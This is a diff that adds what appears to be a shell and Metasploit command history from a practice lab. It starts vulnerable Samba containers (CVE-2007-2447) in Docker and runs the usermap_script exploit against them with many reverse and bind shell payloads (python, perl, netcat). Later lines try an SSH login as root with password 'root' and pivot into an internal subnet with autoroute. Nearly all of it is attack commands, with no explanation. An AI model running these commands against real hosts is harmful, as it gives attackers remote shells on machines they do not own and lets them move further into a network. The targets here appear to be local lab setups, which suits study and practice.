@@ -1,0 +1,95 @@
+use exploit/multi/samba/usermap_script
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LHOST 172.17.0.1
+exploit
+sudo docker ps
+sudo apt intasll docker.io
+sudo apt intasl docker.io
+sudo docker run -d --name samba_target -p 139:139 -p 445:445 medicean/vulhub-samba:cve-2007-2447
+sudo apt update && sudo apt install -y docker.io
+sudo systemctl start docker
+sudo systemctl enable docker
+sudo docker run -d --name samba_target -p 139:139 -p 445:445 medicean/vulhub-samba:cve-2007-2447
+sudo docker ps
+exit
+use exploit/multi/samba/usermap_script
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LHOST 127.0.0.1
+exploit
+sudo docker rm -f $(sudo docker ps -aq)
+sudo docker run -d --name target_final -p 139:139 -p 445:445 citizenstig/samba-vuln
+sudo docker ps
+exit
+use exploit/multi/samba/usermap_script
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LHOST 127.0.0.1
+exploit
+sudo docker start samba_target
+sudo docker ps
+use exploit/multi/samba/usermap_script
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LHOST 172.17.0.1
+exploit
+set LHOST 127.0.0.1
+set LPORT 4444
+exploit
+set LHOST 0.0.0.0
+set ReverseListenerBindAddress 0.0.0.0
+set LPORT 4444
+exploit
+whoami
+id
+exit
+use exploit/multi/samba/usermap_script
+set RHOSTS 127.0.0.1
+run
+set payload cmd/unix/interact
+run
+show payloads
+set payload cmd/unix/reverse_python
+set LHOST 127.0.0.1
+run
+set LHOST 10.0.0.4
+set ReverseListenerBindAddress 0.0.0.0
+run
+set payload cmd/unix/reverse_perl
+set LHOST 10.0.0.4
+set ReverseListenerBindAddress 0.0.0.0
+run
+set payload cmd/unix/reverse_netcat
+set LHOST 172.17.0.1
+set RHOSTS 127.0.0.1
+set RPORT 139
+run
+set payload cmd/unix/reverse_netcat_gaping
+set LHOST 10.0.0.4
+set ReverseListenerBindAddress 0.0.0.0
+run
+set payload cmd/unix/reverse
+run
+set payload cmd/unix/bind_netcat
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LPORT 4444
+exploit
+sudo docker logs samba_target
+set payload cmd/unix/bind_netcat
+set RHOSTS 127.0.0.1
+set RPORT 139
+set LPORT 4444
+exploit
+exit
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 172.50.0.10
+set USERNAME root
+set PASSWORD root
+run
+sessions -i 1
+sessions -u 1
+run autoroute -s 10.0.9.0/24
+background
+sessions -i 2
